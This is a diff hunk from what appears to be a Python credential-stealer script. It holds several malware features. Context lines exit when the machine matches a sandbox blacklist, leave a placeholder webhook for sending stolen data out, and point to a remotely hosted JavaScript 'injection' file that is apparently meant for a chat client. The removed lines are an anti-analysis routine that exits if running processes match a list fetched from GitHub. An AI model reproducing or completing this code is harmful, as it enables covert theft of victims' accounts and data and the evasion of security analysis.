@@ -46,21 +46,6 @@ mac_address = uuid.getnode()
 if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
     os._exit(0)
 
-def processes_and_files_check():   
-    
-    process = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
-    processList = []
-    for processNames in process.split(" "):
-    	if ".exe" in processNames:
-    		processList.append(processNames.replace("K\n", "").replace("\n", ""))
-        
-    processl = requests.get("https://raw.githubusercontent.com/KebabBusiness09/utils/main/process.txt").text
-    if processl in processList:
-    	sys.exit()
-
-processes_and_files_check()
-
-
 wh00k = "WEBHOOK HERE"
 inj_url = "https://raw.githubusercontent.com/PeppinUCocchet/SpammerCrealInj3ction/main/index.js"
     
